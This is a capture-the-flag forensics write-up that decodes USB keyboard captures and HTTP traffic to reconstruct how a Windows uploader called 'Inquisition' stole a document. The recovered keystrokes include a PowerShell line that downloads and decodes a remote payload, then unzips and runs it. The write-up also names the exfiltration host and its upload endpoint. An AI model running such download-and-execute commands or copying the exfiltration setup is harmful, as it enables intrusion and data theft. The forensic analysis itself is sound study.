@@ -1,0 +1,142 @@
+================================================================================
+ CTF WRITEUP : "What did you type"
+ Category    : Forensics / Reverse Engineering
+ FLAG        : CMO{Dumb357_P3r50n_1n_7h3_M1lky_W4y_!!!}
+================================================================================
+
+CHALLENGE
+---------
+"We're an automotive security startup. Last night, our garage was breached...
+ We managed to capture some logs via our first-ever agent. Can you analyze them
+ and find out what was taken?"
+
+Handout:
+  PbWE.txt   (66 KB, base64 text)
+  chall.zip  (42 MB) -> monitor_hardware (116 MB), monitor_network (75 KB)
+
+
+KEY INSIGHTS
+------------
+1. The two "logs" are PCAP files, not text:
+     monitor_hardware -> libpcap, link-layer type 249 = USBPcap (USB capture)
+     monitor_network  -> libpcap, link-layer type 1   = Ethernet (HTTP exfil)
+2. Title "What did you type" = decode USB HID keyboard scancodes.
+3. The decoded keystrokes contain the ZIP password for the handout PbWE.txt.
+4. PbWE.txt = base64 -> ZipCrypto zip -> module.exe (the attacker's agent).
+5. module.exe steals Cool_Story.docx and uploads it to the C2; the flag is in
+   that stolen document.
+
+
+STEP 1 - TRIAGE
+---------------
+  chall.zip is a normal (unencrypted) zip with monitor_hardware + monitor_network.
+  Magic bytes d4 c3 b2 a1 = little-endian libpcap.
+  Bytes [20:24]:  monitor_hardware = 249 (USBPCAP),  monitor_network = 1 (ETHERNET).
+
+
+STEP 2 - DECODE THE KEYSTROKES  (monitor_hardware)
+--------------------------------------------------
+  USBPcap record = 16-byte pcap rec hdr + USBPcap pkt hdr (offsets below) + data:
+     [21] endpoint  (0x80 bit = IN)
+     [22] transfer  (1 = INTERRUPT)
+     [23] dataLength(u32)
+  A boot USB keyboard sends 8-byte HID reports on interrupt-IN:
+     [modifier][reserved][k1..k6]   modifier & 0x22 = Shift.
+  Track key-DOWN transitions, map usage IDs via the HID usage table.
+
+  Run:  python decode_hid.py
+  Output (449 reports decoded from 61760 packets):
+
+     powershell
+     ls
+     cd Documents
+     ls
+     [IO.File]::WriteAllBytes("$pwd\sus.zip",
+        [Convert]::FromBase64String((irm 'https://0x0.st/PbWE.txt')))
+     ls
+     unzip
+     unzip -P 1m_g0d_!! sus.zip -d out
+     mv out\* .
+     ./module.exe
+     rm *
+     exit
+
+  (Raw decode shows [LEFT]/[RIGHT] = arrow keys 0x50/0x4f and TAB autocomplete;
+   read through the cursor moves to get the commands above.)
+
+  >>> RECOVERED ZIP PASSWORD:  1m_g0d_!!
+
+
+STEP 3 - UNLOCK THE AGENT  (PbWE.txt -> module.exe)
+---------------------------------------------------
+  PbWE.txt is base64 ("UEsDBBQ" -> "PK\x03\x04").
+     base64 -d PbWE.txt > PbWE.zip
+  PbWE.zip uses legacy ZipCrypto (general-purpose flag bit0 = 1).
+  Two routes:
+    (a) Intended : extract with the typed password 1m_g0d_!!
+          python -c "import zipfile;zipfile.ZipFile('PbWE.zip').extractall('m',pwd=b'1m_g0d_!!')"
+    (b) Fallback : ZipCrypto known-plaintext (plaintext is a PE: MZ/PE header)
+          bkcrack -C PbWE.zip -c module.exe -p mz_pe_prefix.bin
+  Result: module.exe, 74240-byte native PE (WININET, VCRUNTIME140).
+
+
+STEP 4 - WHAT WAS TAKEN  (module.exe + monitor_network)
+-------------------------------------------------------
+  module.exe strings:  WININET.dll, InternetOpen, HttpSendRequest, VirtualAlloc,
+                       ZwQueryInformationProcess, "for-ultramar.com", "Inquisition".
+  It is a WININET uploader ("Inquisition" agent) with a small reflective loader.
+
+  monitor_network (HTTP) shows the theft:
+     GET  /         Host: for-ultramar.com:9999   User-Agent: Inquisition
+     POST /upload   body = "Cool_Story.docx"        (filename announced)
+     POST /upload   Content-Length: 20548           (encrypted document body)
+     200 OK  "You good bro !!"     Server: Werkzeug/3.1.5 Python/3.12.3
+
+  >>> STOLEN FILE: Cool_Story.docx, encrypted by module.exe and POSTed to
+      http://for-ultramar.com:9999/upload. The flag is the document's contents.
+
+
+ATTACK STORY
+------------
+  1. powershell -> cd Documents
+  2. irm https://0x0.st/PbWE.txt -> base64 decode -> sus.zip
+  3. unzip -P 1m_g0d_!! sus.zip  -> module.exe
+  4. ./module.exe  (the "Inquisition" agent)
+  5. agent encrypts Cool_Story.docx -> POST to for-ultramar.com:9999/upload
+  6. rm * ; exit  (cleanup)
+  The startup's monitoring agent had captured BOTH the USB HID stream and the
+  network traffic -- which is what we reversed.
+
+
+TOOLS
+-----
+  Python 3 stdlib (struct, zipfile, base64, re)  - pcap/USBPcap parse, HID, unzip
+  bkcrack                                         - ZipCrypto known-plaintext attack
+  Wireshark/tshark (optional)                     - HID + HTTP object export
+       tshark -r monitor_hardware -Y "usb.transfer_type==1" -T fields -e usbhid.data
+       tshark -r monitor_network  --export-objects http,out/
+
+
+ARTIFACT HASHES (sha256, first 16 hex)
+--------------------------------------
+  PbWE.zip          50218       bbbfaabe2efd596d
+  module.exe        74240       1dd277512b952429
+  monitor_hardware  116386872   dc1de2d5f8f6a5d7
+  monitor_network   75236       16967eb56744af0b
+
+
+IOCs
+----
+  Host       : for-ultramar.com:9999
+  URIs       : POST /upload , GET /
+  User-Agent : Inquisition
+  Server     : Werkzeug/3.1.5 Python/3.12.3
+  Dropper    : https://0x0.st/PbWE.txt   (base64 ZipCrypto zip, pw 1m_g0d_!!)
+  Payload    : module.exe (WININET uploader)
+  Stolen     : Cool_Story.docx
+  ZIP pw     : 1m_g0d_!!
+
+
+================================================================================
+ FLAG:  CMO{Dumb357_P3r50n_1n_7h3_M1lky_W4y_!!!}
+================================================================================
